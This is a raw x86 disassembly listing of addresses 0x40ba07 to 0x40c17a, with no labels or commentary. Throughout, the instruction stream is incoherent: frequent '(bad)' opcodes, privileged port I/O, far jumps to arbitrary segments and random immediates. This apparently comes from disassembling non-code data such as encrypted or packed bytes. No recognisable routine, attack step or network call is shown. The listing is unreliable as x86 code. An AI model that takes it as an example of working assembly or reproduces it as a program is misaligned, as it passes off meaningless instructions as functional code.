  40ba07:	mov    cl,0x15
  40ba09:	adc    eax,0xca296186
  40ba0e:	in     eax,0xb3
  40ba10:	mov    ebx,0xddbd7fa5
  40ba15:	stos   DWORD PTR es:[edi],eax
  40ba16:	imul   edx,DWORD PTR [eax],0x15
  40ba19:	loopne 0x40b99d
  40ba1b:	pop    ss
  40ba1c:	cmp    eax,0x2e3a3590
  40ba21:	std    
  40ba22:	push   0xfffffffe
  40ba24:	adc    dh,al
  40ba26:	sbb    eax,0x9282df
  40ba2b:	data16 stc 
  40ba2d:	cmp    ecx,0xf04135c5
  40ba33:	cmc    
  40ba34:	and    BYTE PTR [edi],al
  40ba36:	xor    BYTE PTR [edi],al
  40ba38:	ja     0x40b9c5
  40ba3a:	clc    
  40ba3b:	lds    ebp,FWORD PTR [edi-0x393fa841]
  40ba41:	iret   
  40ba42:	fsubr  QWORD PTR [ebx]
  40ba44:	and    dh,BYTE PTR [edi-0x17fce390]
  40ba4a:	and    al,0x54
  40ba4c:	lahf   
  40ba4d:	jo     0x40b9fe
  40ba4f:	aad    0xfd
  40ba51:	add    eax,0x1838fd95
  40ba56:	(bad)  
  40ba57:	in     al,0x73
  40ba59:	ror    BYTE PTR [esi],cl
  40ba5b:	out    0xc8,al
  40ba5d:	pop    edx
  40ba5e:	nop
  40ba5f:	sub    eax,0x1e4f08fa
  40ba64:	loop   0x40bac9
  40ba66:	xchg   DWORD PTR [esi+ebp*8+0x5e],ebx
  40ba6a:	retf   
  40ba6b:	enter  0x583c,0x3
  40ba6f:	lea    edx,[esi]
  40ba71:	mov    eax,0xb90093ae
  40ba76:	sbb    al,0x7f
  40ba78:	xchg   ecx,eax
  40ba79:	inc    esp
  40ba7a:	mov    ds:0xa7648acd,al
  40ba7f:	aam    0xca
  40ba81:	mov    WORD PTR [ebp+ebp*2-0x453cf7dc],?
  40ba88:	dec    edi
  40ba89:	icebp  
  40ba8a:	mov    eax,ds:0xf08168a6
  40ba8f:	sar    BYTE PTR [eax-0x33],1
  40ba92:	mov    esp,gs
  40ba94:	sub    dh,cl
  40ba96:	pushw  0x3c49
  40ba9a:	jno    0x40bae1
  40ba9c:	push   ecx
  40ba9d:	out    0x5b,eax
  40ba9f:	mov    eax,0xd108c83b
  40baa4:	mov    ds:0xf28a9697,al
  40baa9:	push   ebp
  40baaa:	ror    BYTE PTR [ebx-0x15],cl
  40baad:	(bad)  
  40baae:	call   0x9e87eefc
  40bab3:	sub    DWORD PTR [ecx+0x39e208b5],ebp
  40bab9:	mov    bl,0x88
  40babb:	sbb    edx,DWORD PTR [edx+0x6]
  40babe:	rol    DWORD PTR [edi],cl
  40bac0:	adc    DWORD PTR ss:[ebx-0x59d8bd4b],ecx
  40bac7:	ret    0x53e3
  40baca:	add    ecx,DWORD PTR [edx-0x7c]
  40bacd:	aam    0xe2
  40bacf:	(bad)  [ebx]
  40bad1:	mov    ecx,gs
  40bad3:	pop    ecx
  40bad4:	and    edx,DWORD PTR [esi+0x4c2d9e20]
  40bada:	lods   eax,DWORD PTR ds:[esi]
  40badb:	scas   al,BYTE PTR es:[edi]
  40badc:	icebp  
  40badd:	mov    ds:0xe0495b8,al
  40bae2:	popa   
  40bae3:	sbb    DWORD PTR [eax-0x1b],esp
  40bae6:	inc    ecx
  40bae7:	(bad)  
  40bae8:	adc    ch,ah
  40baea:	pushf  
  40baeb:	jmp    0xaf7a:0xeba6d40a
  40baf2:	push   esp
  40baf3:	pop    eax
  40baf4:	fcom   QWORD PTR [ebx-0x26b47e71]
  40bafa:	lds    esi,FWORD PTR [eax-0xc03dc10]
  40bb00:	xchg   ebp,eax
  40bb01:	mov    BYTE PTR [esp+ebp*2-0x29a2688b],al
  40bb08:	leave  
  40bb09:	stos   DWORD PTR es:[edi],eax
  40bb0a:	bound  esi,QWORD PTR [edi+esi*1]
  40bb0d:	mov    WORD PTR [edx-0x70],ds
  40bb10:	push   esp
  40bb11:	jns    0x40baa9
  40bb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb14:	outs   dx,BYTE PTR ds:[esi]
  40bb15:	stos   BYTE PTR es:[edi],al
  40bb16:	xchg   BYTE PTR [ebx],dl
  40bb18:	mov    BYTE PTR [edi],dl
  40bb1a:	(bad)  
  40bb1c:	repz sub ecx,DWORD PTR [eax-0xebd019b]
  40bb23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb24:	mov    ds:0xa28c4f4b,al
  40bb29:	add    BYTE PTR cs:[ecx+0x4a],bl
  40bb2d:	cmp    al,0x2f
  40bb2f:	imul   esi,esi,0xd618e877
  40bb35:	stos   BYTE PTR es:[edi],al
  40bb36:	inc    esp
  40bb37:	pop    esp
  40bb38:	(bad)  [ebx]
  40bb3a:	data16 out 0xae,al
  40bb3d:	call   0xa4a5cec5
  40bb42:	in     al,0xa4
  40bb44:	out    0xfa,al
  40bb46:	ret    0xefb5
  40bb49:	jne    0x40bb54
  40bb4b:	ss add ecx,edi
  40bb4e:	rcr    DWORD PTR [edi+0x46f7e962],1
  40bb54:	inc    ebp
  40bb55:	mov    al,0xe7
  40bb57:	sahf   
  40bb58:	and    eax,0xdf77d814
  40bb5d:	and    DWORD PTR [esi+0x1bdc46ac],esi
  40bb63:	call   0xaac9:0x29acc954
  40bb6a:	cs test eax,0xad06e491
  40bb70:	jle    0x40bb4a
  40bb72:	rcl    edi,0xd6
  40bb75:	sbb    ah,cl
  40bb77:	jg     0x40bb79
  40bb79:	jns    0x40bb2f
  40bb7b:	dec    edi
  40bb7c:	xchg   esp,eax
  40bb7d:	out    dx,al
  40bb7e:	or     edx,DWORD PTR [ebx-0x565b4f2d]
  40bb84:	mov    bl,0x79
  40bb86:	and    eax,DWORD PTR [ebp-0x732e4c9]
  40bb8c:	xchg   ebp,eax
  40bb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb8e:	and    eax,edx
  40bb90:	imul   edx,esi,0x2f
  40bb93:	arpl   WORD PTR [ebp+0x68e0235b],dx
  40bb99:	fs das 
  40bb9b:	pop    ebx
  40bb9c:	ret    
  40bb9d:	xchg   esi,eax
  40bb9e:	ss pop es
  40bba0:	outs   dx,BYTE PTR ds:[esi]
  40bba1:	sbb    eax,0xa29c256c
  40bba6:	jmp    0x40bc10
  40bba8:	ss push edx
  40bbaa:	out    dx,al
  40bbab:	frstor [edx-0x25240ace]
  40bbb1:	xchg   ebx,eax
  40bbb2:	int    0xd3
  40bbb4:	ins    DWORD PTR es:[edi],dx
  40bbb5:	push   edx
  40bbb6:	push   0x17
  40bbb8:	sub    bl,bh
  40bbba:	fst    DWORD PTR [ecx-0x56]
  40bbbd:	adc    cl,BYTE PTR [edi+0x20]
  40bbc0:	jno    0x40bc40
  40bbc2:	mov    ch,0xe2
  40bbc4:	cmp    al,0x60
  40bbc6:	push   ds
  40bbc7:	or     DWORD PTR [ecx],ebp
  40bbc9:	xor    DWORD PTR [eax-0x5cb9217],0xfffffff6
  40bbd0:	fstp   TBYTE PTR [edi+edx*8+0x77a6c5a1]
  40bbd7:	je     0x40bc35
  40bbd9:	repz das 
  40bbdb:	jnp    0x40bb87
  40bbdd:	dec    esi
  40bbde:	(bad)  
  40bbdf:	iret   
  40bbe0:	loope  0x40bb98
  40bbe2:	xor    edx,edx
  40bbe4:	add    al,0xdc
  40bbe6:	push   esp
  40bbe7:	and    esi,DWORD PTR [eax+0x1c8f08c8]
  40bbed:	xor    al,0xf0
  40bbef:	je     0x40bb8f
  40bbf1:	pop    eax
  40bbf2:	mov    ebx,0x49a33ef
  40bbf7:	sbb    eax,0x9ad92002
  40bbfc:	ds inc esp
  40bbfe:	xchg   edi,eax
  40bbff:	mov    ebx,0x11ae4852
  40bc04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc05:	jne    0x40bc4a
  40bc07:	inc    ebx
  40bc08:	popa   
  40bc09:	out    dx,eax
  40bc0a:	xchg   ecx,eax
  40bc0b:	retf   
  40bc0c:	ss in  eax,dx
  40bc0e:	(bad)  
  40bc0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc10:	pop    edi
  40bc11:	jmp    0x73fc5f2f
  40bc16:	ja     0x40bbf5
  40bc18:	dec    ebx
  40bc19:	adc    al,0xc0
  40bc1b:	mul    BYTE PTR [esi-0x70]
  40bc1e:	test   DWORD PTR [ecx-0x3e180097],ebp
  40bc24:	sub    al,0x4f
  40bc26:	mov    DWORD PTR ds:0x9ae812f6,0x7f968e20
  40bc30:	(bad)  
  40bc31:	(bad)  
  40bc32:	in     eax,0xbe
  40bc34:	jne    0x40bc65
  40bc36:	jne    0x40bc03
  40bc38:	loop   0x40bbbd
  40bc3a:	leave  
  40bc3b:	mov    eax,0x414b598c
  40bc40:	cmp    al,0x6d
  40bc42:	cdq    
  40bc43:	fstp   TBYTE PTR [edi]
  40bc45:	pushf  
  40bc46:	stos   DWORD PTR es:[edi],eax
  40bc47:	dec    edi
  40bc48:	jp     0x40bbee
  40bc4a:	mov    bl,ah
  40bc4c:	pop    eax
  40bc4d:	in     eax,0x56
  40bc4f:	pop    ds
  40bc50:	inc    ecx
  40bc51:	mov    dl,0x8d
  40bc53:	pop    ss
  40bc54:	cmp    eax,0xc36f950d
  40bc59:	outs   dx,BYTE PTR ds:[esi]
  40bc5a:	jmp    0xdbcbf394
  40bc5f:	jmp    0x40bc1c
  40bc61:	jne    0x40bc5d
  40bc63:	mov    esp,0xc4b1b162
  40bc68:	dec    ebx
  40bc69:	sub    DWORD PTR [eax],esp
  40bc6b:	fadd   QWORD PTR [ecx+0x59c3228e]
  40bc71:	ins    DWORD PTR es:[edi],dx
  40bc72:	jmp    DWORD PTR [edx-0x47]
  40bc75:	(bad)  
  40bc76:	cs cwde 
  40bc78:	test   esi,edx
  40bc7a:	fwait
  40bc7b:	add    DWORD PTR [esi+0x15],0xffffffd5
  40bc7f:	ds or  bh,dh
  40bc82:	jo     0x40bc6b
  40bc84:	jge    0x40bca9
  40bc86:	shl    BYTE PTR [ebx-0xb88da88],1
  40bc8c:	mov    dh,0x2a
  40bc8e:	mov    dh,0x9c
  40bc90:	xlat   BYTE PTR ds:[ebx]
  40bc91:	and    al,0x4
  40bc93:	inc    esp
  40bc94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc95:	sub    ch,BYTE PTR [edx-0x2b543f34]
  40bc9b:	mov    esp,0xe1184d7f
  40bca0:	stos   BYTE PTR es:[edi],al
  40bca1:	jg     0x40bc61
  40bca3:	mov    cl,0x55
  40bca5:	fs jecxz 0x40bc91
  40bca8:	mov    bl,0xda
  40bcaa:	and    al,0x95
  40bcac:	test   BYTE PTR [edi-0xc],0x21
  40bcb0:	test   eax,0xe2936ab6
  40bcb5:	aas    
  40bcb6:	dec    ebx
  40bcb7:	cmp    eax,0x66fa4bb8
  40bcbc:	push   esp
  40bcbd:	push   0xfffffff8
  40bcbf:	sar    DWORD PTR [eax+0x5a1f7c14],cl
  40bcc5:	outs   dx,DWORD PTR ds:[esi]
  40bcc6:	sub    BYTE PTR [esi-0xd8c4153],0xce
  40bccd:	mov    eax,ds:0xcf9b428
  40bcd2:	cmp    al,0x37
  40bcd4:	sub    bh,BYTE PTR [edx-0xb]
  40bcd7:	add    edi,esi
  40bcd9:	hlt    
  40bcda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcdb:	pushf  
  40bcdc:	stos   DWORD PTR es:[edi],eax
  40bcdd:	or     al,0xb4
  40bcdf:	sbb    eax,0x2565b727
  40bce4:	mov    dl,0x2
  40bce6:	test   eax,0x1713ad17
  40bceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcec:	mov    eax,ds:0x382e84d
  40bcf1:	popa   
  40bcf2:	shl    BYTE PTR [esi],0xf1
  40bcf5:	js     0x40bce9
  40bcf7:	imul   esi,DWORD PTR [edx-0x6a2d05d2],0x7fc72ed6
  40bd01:	mov    dl,0xf9
  40bd03:	push   DWORD PTR [ebx+0xf7432f9]
  40bd09:	mov    esp,0x6c77fa2a
  40bd0e:	rcl    DWORD PTR ds:0x65b576ad,1
  40bd14:	outs   dx,DWORD PTR ds:[esi]
  40bd15:	jl     0x40bd81
  40bd17:	mov    ecx,0xd67df3ea
  40bd1c:	mov    dh,0x70
  40bd1e:	xor    eax,0x152aeb7a
  40bd23:	cmp    ch,ch
  40bd25:	jmp    0xe908:0xb4565765
  40bd2c:	adc    BYTE PTR [esi+0x5d07e487],ah
  40bd32:	les    esp,FWORD PTR [edi+0x194a478d]
  40bd38:	loope  0x40bcc3
  40bd3a:	jno    0x40bd5a
  40bd3c:	jae    0x40bdb4
  40bd3e:	inc    ebp
  40bd3f:	pop    ebx
  40bd40:	xor    eax,0xfae75b43
  40bd45:	jmp    0x40bd15
  40bd47:	cmp    eax,0x57ca2c6d
  40bd4c:	mov    cl,ah
  40bd4e:	sub    DWORD PTR [esi+eax*8-0x2de03492],0xf5f8cfd9
  40bd59:	ret    0xae4e
  40bd5c:	or     eax,0xa6f49a5
  40bd61:	shr    BYTE PTR [edx],cl
  40bd63:	enter  0x8980,0x98
  40bd67:	cwde   
  40bd68:	rol    edi,cl
  40bd6a:	adc    al,0x38
  40bd6c:	fild   WORD PTR [eax-0x28]
  40bd6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd70:	cmp    BYTE PTR [edi],ch
  40bd72:	in     eax,0x9
  40bd74:	sbb    DWORD PTR [edi+0xa],0x51
  40bd78:	dec    eax
  40bd79:	int3   
  40bd7a:	dec    ebx
  40bd7b:	xor    bl,al
  40bd7d:	xchg   BYTE PTR [eax],bl
  40bd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd80:	dec    esi
  40bd81:	jl     0x40bde5
  40bd83:	hlt    
  40bd84:	cmc    
  40bd85:	retf   
  40bd86:	cld    
  40bd87:	cmp    cl,BYTE PTR [ecx+0x3213e9b8]
  40bd8d:	das    
  40bd8e:	pop    eax
  40bd8f:	cli    
  40bd90:	fidivr DWORD PTR ds:0x989e89fe
  40bd96:	mov    bl,0xa0
  40bd98:	jl     0x40bda1
  40bd9a:	adc    eax,DWORD PTR [esi]
  40bd9c:	inc    ebx
  40bd9d:	xor    eax,eax
  40bd9f:	add    eax,0x3764f922
  40bda4:	cmc    
  40bda5:	arpl   WORD PTR [ecx+0x20],si
  40bda8:	xor    eax,0x24151dc5
  40bdad:	inc    ebp
  40bdae:	cs inc edx
  40bdb0:	test   eax,0xe05aa2cc
  40bdb5:	out    dx,al
  40bdb6:	rcr    DWORD PTR [ecx+ebx*2],1
  40bdb9:	popf   
  40bdba:	or     al,0x75
  40bdbc:	add    DWORD PTR [edi-0x48],ebx
  40bdbf:	xchg   eax,ecx
  40bdc1:	into   
  40bdc2:	inc    ebx
  40bdc3:	and    eax,ebp
  40bdc5:	inc    esi
  40bdc6:	loope  0x40bd54
  40bdc8:	mov    ch,0xd5
  40bdca:	fwait
  40bdcb:	adc    dl,ch
  40bdcd:	xor    DWORD PTR [edx+0x2f],ebx
  40bdd0:	xchg   ebp,eax
  40bdd1:	iret   
  40bdd2:	out    dx,al
  40bdd3:	pop    ebx
  40bdd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdd5:	test   eax,0x3c7622c2
  40bdda:	outs   dx,BYTE PTR ds:[esi]
  40bddb:	dec    ecx
  40bddc:	and    eax,DWORD PTR ds:0x763c8624
  40bde2:	cwde   
  40bde3:	xchg   ebx,eax
  40bde4:	mov    DWORD PTR [edi],eax
  40bde6:	rol    DWORD PTR [esi],0xe9
  40bde9:	nop/reserved BYTE PTR [ebx+edi*1]
  40bded:	mov    ch,0x52
  40bdef:	add    DWORD PTR ds:0xd151321a,esi
  40bdf5:	int    0x43
  40bdf7:	mov    ds:0xac0f9037,al
  40bdfc:	enter  0xc102,0xe9
  40be00:	add    cl,BYTE PTR [ebx-0x7a165fb3]
  40be06:	add    eax,0xfd7d0000
  40be0b:	or     BYTE PTR [edx+eax*4],0x79
  40be0f:	js     0x40be8d
  40be11:	xor    edi,DWORD PTR [edx-0x34]
  40be14:	outs   dx,BYTE PTR ds:[esi]
  40be15:	es and eax,0xe81fb42c
  40be1b:	push   ss
  40be1c:	push   ss
  40be1d:	cmp    eax,0x19161604
  40be22:	jge    0x40bdf5
  40be24:	out    dx,al
  40be25:	fiadd  DWORD PTR [ecx]
  40be27:	shl    BYTE PTR ds:0x6b0dfd89,cl
  40be2d:	sub    DWORD PTR [edx+0x724e047d],ebx
  40be33:	mov    ds,WORD PTR [edx]
  40be35:	or     BYTE PTR [ebx+0x2f],bh
  40be38:	shl    al,cl
  40be3a:	sbb    ebx,esi
  40be3c:	mov    bl,ah
  40be3e:	xchg   ebp,eax
  40be3f:	retf   0xa8ea
  40be42:	out    0x2,eax
  40be44:	clc    
  40be45:	ss xchg ebp,eax
  40be47:	push   ebp
  40be48:	call   FWORD PTR [ecx-0x7d66e80d]
  40be4e:	lods   al,BYTE PTR ds:[esi]
  40be4f:	xchg   cl,ch
  40be51:	xor    edx,DWORD PTR [edi-0x6d]
  40be54:	adc    esi,DWORD PTR [eax+ecx*4]
  40be57:	scas   eax,DWORD PTR es:[edi]
  40be58:	fs mov dh,0x8c
  40be5b:	fs jns 0x40bdf1
  40be5e:	(bad)  
  40be5f:	pop    ecx
  40be60:	adc    eax,0xeaf65e0b
  40be65:	arpl   WORD PTR [edi-0x1b1ec1b7],bx
  40be6b:	push   ebx
  40be6c:	cmp    ecx,DWORD PTR ds:0x45c60d4e
  40be72:	mov    edx,0x3fc8600c
  40be77:	adc    al,0x70
  40be79:	arpl   WORD PTR [ebx-0x1aed3bfb],sp
  40be7f:	pop    esi
  40be80:	pop    DWORD PTR [edi]
  40be82:	rep stos BYTE PTR es:[edi],al
  40be84:	jae    0x40be09
  40be86:	retf   
  40be87:	push   ecx
  40be88:	mov    bh,bl
  40be8a:	inc    eax
  40be8b:	inc    ebp
  40be8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be8d:	xor    al,0x9d
  40be8f:	aaa    
  40be90:	jb     0xa2473aa5
  40be96:	aaa    
  40be97:	mov    ebp,0xaa5e2fc8
  40be9c:	das    
  40be9d:	inc    esi
  40be9e:	aas    
  40be9f:	sbb    ebx,esi
  40bea1:	mov    DWORD PTR [ebp+0x648ff4bf],0x2e22cb2e
  40beab:	pop    edx
  40beac:	mov    ah,0x5
  40beae:	out    dx,al
  40beaf:	fisubr WORD PTR [esi+0x55875638]
  40beb5:	test   al,0xab
  40beb7:	sbb    eax,esi
  40beb9:	pop    edx
  40beba:	inc    edx
  40bebb:	or     dh,cl
  40bebd:	jmp    0x40bf3c
  40bebf:	aaa    
  40bec0:	(bad)  
  40bec1:	xor    dl,BYTE PTR [eax]
  40bec3:	fnstcw WORD PTR [eax+0x249bdb72]
  40bec9:	cld    
  40beca:	(bad)  
  40becb:	cmp    al,0x4
  40becd:	mov    edx,0x40fd8b18
  40bed2:	loopne 0x40bee8
  40bed4:	in     al,0xb1
  40bed6:	repnz push edi
  40bed8:	dec    ebp
  40bed9:	mov    WORD PTR [esi-0x3a],cs
  40bedc:	daa    
  40bedd:	sti    
  40bede:	and    eax,0xc0a9c921
  40bee3:	enter  0xc129,0xa6
  40bee7:	pop    ss
  40bee8:	dec    edi
  40bee9:	fnsave [eax]
  40beeb:	cmp    ah,BYTE PTR [ecx+0x24]
  40beee:	sub    edx,0xffffff91
  40bef1:	push   ss
  40bef2:	dec    esp
  40bef3:	ds mov ebp,0xec57644b
  40bef9:	mov    ebp,0x9828cedf
  40befe:	pop    esp
  40beff:	inc    edi
  40bf00:	adc    bh,bl
  40bf02:	test   eax,0xcb597ea9
  40bf07:	fwait
  40bf08:	cmp    DWORD PTR [esi-0x7ae86d20],ecx
  40bf0e:	pushw  0x3b62
  40bf12:	aaa    
  40bf13:	sbb    al,0x88
  40bf15:	test   DWORD PTR [eax+0x16d87dab],ebx
  40bf1b:	lods   al,BYTE PTR ds:[esi]
  40bf1c:	or     cl,BYTE PTR [edx+0x2889d2f]
  40bf22:	or     ecx,DWORD PTR [ebx-0x43]
  40bf25:	pop    ss
  40bf26:	es (bad) 
  40bf28:	adc    DWORD PTR [ebx+0x7a],esi
  40bf2b:	gs in  eax,0x67
  40bf2e:	(bad)  
  40bf2f:	mov    al,0x86
  40bf31:	clc    
  40bf32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf33:	(bad)  
  40bf34:	(bad)  [esi+0x34]
  40bf37:	lea    ecx,[esi+0x62]
  40bf3a:	ins    BYTE PTR es:[edi],dx
  40bf3b:	pop    ecx
  40bf3c:	adc    BYTE PTR [ecx+edi*8],dh
  40bf3f:	ficom  WORD PTR [ebx]
  40bf41:	(bad)  
  40bf42:	sbb    ch,BYTE PTR [esi+0x6c]
  40bf45:	push   ss
  40bf46:	rol    DWORD PTR [edx],cl
  40bf48:	cwde   
  40bf49:	bound  ecx,QWORD PTR [ebx+0x60192e5a]
  40bf4f:	test   eax,0x1505c4ce
  40bf54:	mov    ebx,0xe84a2e72
  40bf59:	sub    ah,BYTE PTR [eax]
  40bf5b:	jecxz  0x40bf40
  40bf5d:	push   ebx
  40bf5e:	cmp    ah,bh
  40bf60:	mov    eax,ds:0x1a28ff95
  40bf65:	mov    bl,0x6
  40bf67:	popa   
  40bf68:	jmp    0x807f:0xfe0ea4a2
  40bf6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf70:	js     0x40bf00
  40bf72:	pop    edi
  40bf73:	into   
  40bf74:	or     DWORD PTR [eax-0xa],ebp
  40bf77:	es inc ebx
  40bf79:	and    BYTE PTR [ebp-0x355596ed],ch
  40bf7f:	cmp    DWORD PTR [ecx],esp
  40bf81:	add    DWORD PTR [ebx],ebp
  40bf83:	cmc    
  40bf84:	pushf  
  40bf85:	(bad)  
  40bf86:	lods   eax,DWORD PTR ds:[esi]
  40bf87:	sti    
  40bf88:	jmp    0x40bfbd
  40bf8a:	mov    edx,0xbd616306
  40bf8f:	loop   0x40bfc9
  40bf91:	pop    ds
  40bf92:	mov    esp,0x309e575
  40bf97:	enter  0x35ca,0xa3
  40bf9b:	push   es
  40bf9c:	iret   
  40bf9d:	inc    esp
  40bf9e:	push   0x7494bbb8
  40bfa3:	bswap  ebx
  40bfa5:	fld    QWORD PTR [ebp+0x75d144a4]
  40bfab:	push   cs
  40bfac:	and    al,0xdf
  40bfae:	add    edi,DWORD PTR [esi+0x8681a09]
  40bfb4:	ins    BYTE PTR es:[edi],dx
  40bfb5:	xor    dl,BYTE PTR [ecx]
  40bfb7:	scas   al,BYTE PTR es:[edi]
  40bfb8:	cmp    DWORD PTR [ebx],0x27
  40bfbb:	push   edx
  40bfbc:	imul   ebp,DWORD PTR [edx-0x6e99361d],0x4dcc9808
  40bfc6:	loopne 0x40bfef
  40bfc8:	and    al,0x46
  40bfca:	adc    BYTE PTR [edx+0x38],0x78
  40bfce:	sbb    al,0x1c
  40bfd0:	int3   
  40bfd1:	sbb    al,0x67
  40bfd3:	and    eax,0x3ee9caf1
  40bfd8:	xor    ch,ah
  40bfda:	xchg   esi,eax
  40bfdb:	jne    0x40bfed
  40bfdd:	call   0x81ef9b4
  40bfe2:	jb     0x40bfab
  40bfe4:	into   
  40bfe5:	test   bl,dl
  40bfe7:	(bad)  
  40bfe8:	ja     0x40bfe7
  40bfea:	xor    BYTE PTR [edx+0x5735b4c4],0x85
  40bff1:	add    edi,DWORD PTR [ebx]
  40bff3:	xchg   ecx,eax
  40bff4:	add    BYTE PTR [edi+ebx*8-0x35146d83],bl
  40bffb:	mov    esi,DWORD PTR [edi+0x19]
  40bffe:	sbb    DWORD PTR [esi],esp
  40c000:	xchg   BYTE PTR [ecx],bl
  40c002:	call   0x36d2:0x7a440264
  40c009:	jge    0x40c00f
  40c00b:	xchg   DWORD PTR [edi+0x33],edi
  40c00e:	call   0xa166:0x5bd3860
  40c015:	add    edx,DWORD PTR [ebx+eiz*4]
  40c018:	cmp    BYTE PTR [eax+ebx*1+0xc654fcf],bh
  40c01f:	ja     0x40bff5
  40c021:	fwait
  40c022:	pop    esi
  40c023:	loop   0x40c085
  40c025:	aas    
  40c026:	mov    cs,WORD PTR [esi]
  40c028:	push   ebp
  40c029:	or     ebp,DWORD PTR [eax]
  40c02b:	sub    DWORD PTR [eax+0x37],edx
  40c02e:	mov    WORD PTR [ebp+0xf],ss
  40c031:	sub    DWORD PTR [esi],ecx
  40c033:	push   ecx
  40c034:	int3   
  40c035:	jns    0x40bfbd
  40c037:	in     al,0xde
  40c039:	xchg   ebp,eax
  40c03a:	xor    eax,0x12f341b6
  40c03f:	ins    DWORD PTR es:[edi],dx
  40c040:	ins    BYTE PTR es:[edi],dx
  40c041:	ins    BYTE PTR es:[edi],dx
  40c042:	mov    bh,0x57
  40c044:	lahf   
  40c045:	ins    DWORD PTR es:[edi],dx
  40c046:	xor    dh,BYTE PTR [ebx+eax*1]
  40c049:	lahf   
  40c04a:	mov    cl,0x75
  40c04c:	lock cld 
  40c04e:	pop    ebx
  40c04f:	sbb    eax,0x8d28d2d7
  40c054:	mov    edi,0x15793e76
  40c059:	dec    edx
  40c05a:	call   DWORD PTR [edi+ebp*1+0x30]
  40c05e:	das    
  40c05f:	mov    al,0x9d
  40c061:	push   ebx
  40c062:	iret   
  40c063:	shl    DWORD PTR [edi-0x26],0x7b
  40c067:	dec    esp
  40c068:	lods   eax,DWORD PTR ds:[esi]
  40c069:	les    eax,FWORD PTR [eax-0x10a70bf5]
  40c06f:	jnp    0x40bff4
  40c071:	pop    es
  40c072:	push   ds
  40c073:	xchg   ebx,eax
  40c074:	inc    esp
  40c075:	cmp    DWORD PTR [edi-0x4e5b7101],edi
  40c07b:	fist   WORD PTR [ebx+0x77a74c4]
  40c081:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c083:	or     esi,DWORD PTR ds:0x77cb7e1e
  40c089:	jb     0x40c04c
  40c08b:	pop    edi
  40c08c:	es scas al,BYTE PTR es:[edi]
  40c08e:	and    al,0x72
  40c090:	inc    edi
  40c091:	inc    ebx
  40c092:	int    0xde
  40c094:	inc    esi
  40c095:	lock sbb esi,eax
  40c098:	es sahf 
  40c09a:	xor    DWORD PTR [esi],esp
  40c09c:	add    eax,0x5094fc20
  40c0a1:	retf   
  40c0a2:	out    0x1a,al
  40c0a4:	sub    eax,0x65ae2a8f
  40c0a9:	push   esp
  40c0aa:	push   es
  40c0ab:	mov    dh,0x6b
  40c0ad:	sahf   
  40c0ae:	and    eax,0x625acfad
  40c0b3:	sub    ch,BYTE PTR [esi+0x26]
  40c0b6:	pop    edx
  40c0b7:	loopne 0x40c0f6
  40c0b9:	into   
  40c0ba:	mov    eax,0x3b4a9d7e
  40c0bf:	retf   0xeec7
  40c0c2:	enter  0xcc60,0x9e
  40c0c6:	ret    0x7e9a
  40c0c9:	call   0xa060cddb
  40c0ce:	imul   edi,ebx,0x2
  40c0d1:	fdivr  st,st(7)
  40c0d3:	sahf   
  40c0d4:	(bad)  
  40c0d5:	mov    ebx,0xdeb25029
  40c0da:	inc    esp
  40c0db:	cmp    ecx,esi
  40c0dd:	adc    edi,DWORD PTR [edi+0x58bf1a2a]
  40c0e3:	repnz loopne 0x40c0d2
  40c0e6:	ja     0x40c148
  40c0e8:	stos   BYTE PTR es:[edi],al
  40c0e9:	mov    ebx,0x39b17052
  40c0ee:	or     esp,ebp
  40c0f0:	pop    esi
  40c0f1:	and    bh,BYTE PTR [esi-0x2d]
  40c0f4:	cmp    eax,0x7bdb3e72
  40c0f9:	pop    ebp
  40c0fa:	sbb    edi,DWORD PTR [edi+0xc82be53]
  40c100:	ret    
  40c101:	cdq    
  40c102:	sub    al,0x61
  40c104:	dec    esp
  40c105:	inc    edx
  40c106:	and    al,0xa5
  40c108:	cli    
  40c109:	mov    edi,0xc1ef1dbb
  40c10e:	dec    eax
  40c10f:	mov    al,0x4e
  40c111:	inc    edx
  40c112:	in     eax,dx
  40c113:	fidiv  DWORD PTR [eax]
  40c115:	and    edi,DWORD PTR [edx-0x6de2e2cb]
  40c11b:	sub    al,0x3c
  40c11d:	cdq    
  40c11e:	xor    ebp,DWORD PTR [edx+0x2a24543e]
  40c124:	add    eax,0x755fdf3
  40c129:	pop    ebx
  40c12a:	ret    
  40c12b:	nop
  40c12c:	ins    DWORD PTR es:[edi],dx
  40c12d:	inc    eax
  40c12e:	xchg   esi,eax
  40c12f:	jmp    0x40c170
  40c131:	and    ebx,DWORD PTR [eax]
  40c133:	inc    esi
  40c134:	dec    edi
  40c135:	sbb    eax,0x7b10fba0
  40c13a:	sub    al,0xf4
  40c13c:	cmp    BYTE PTR [edi],ah
  40c13e:	mov    eax,ds:0x83d10abd
  40c143:	test   ecx,edi
  40c145:	xchg   dl,cl
  40c147:	push   ebx
  40c148:	cmp    dh,BYTE PTR [ebx-0x2ced36d9]
  40c14e:	pop    ebx
  40c14f:	scas   al,BYTE PTR es:[edi]
  40c150:	jl     0x40c1c3
  40c152:	push   ebp
  40c153:	pushw  0xffa3
  40c156:	jge    0x40c105
  40c158:	sub    cl,BYTE PTR [eax+ebx*4+0x1efd64b6]
  40c15f:	mov    ah,0xce
  40c161:	(bad)  
  40c162:	mul    DWORD PTR [esi-0x5a]
  40c165:	push   eax
  40c166:	pop    ebx
  40c167:	mov    dh,0xd1
  40c169:	dec    ebx
  40c16a:	sbb    BYTE PTR gs:[ecx],dl
  40c16d:	jg     0x40c137
  40c16f:	jnp    0x40c1d2
  40c171:	add    edx,DWORD PTR [edx]
  40c173:	and    eax,0x7828036f
  40c178:	jl     0x40c14e
  40c17a:	inc    ebp
